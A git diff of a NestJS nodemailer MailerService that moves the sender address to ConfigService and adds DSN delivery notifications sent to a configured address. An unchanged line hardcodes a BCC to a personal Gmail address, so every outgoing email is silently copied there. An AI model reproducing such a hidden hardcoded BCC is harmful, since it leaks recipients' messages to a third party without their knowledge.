@@ -2,12 +2,14 @@ import { Injectable } from '@nestjs/common';
 import * as nodemailer from 'nodemailer';
 import * as process from 'node:process';
 import * as hbs from 'nodemailer-express-handlebars';
+import { ConfigService } from '@nestjs/config';
+import { randomStringGenerator } from '@nestjs/common/utils/random-string-generator.util';
 
 @Injectable()
 export class MailerService {
   private transporter: nodemailer.Transporter;
 
-  constructor() {
+  constructor(private readonly configService: ConfigService) {
     this.transporter = nodemailer.createTransport({
       host: process.env.SMTP_HOST,
       port: parseInt(process.env.SMTP_PORT),
@@ -36,13 +38,19 @@ export class MailerService {
 
   async sendEmail({ to, fromEmail = '', subject, template, context, attachments = [] }) {
     const mailOptions = {
-      from: fromEmail || process.env.SMTP_FROM_EMAIL,
+      from: fromEmail || this.configService.get<string>('SMTP_FROM_EMAIL'),
       to,
       bcc: ['tuhin.world@gmail.com'],
       subject,
       template, // Handlebars template name (without .hbs)
       context, // Dynamic data for template
       attachments,
+      dsn: {
+        id: randomStringGenerator(),
+        return: 'full',
+        notify: ['failure', 'delay'],
+        recipient: this.configService.get<string>('DELAY_CATCH_EMAIL'),
+      },
     };
 
     try {
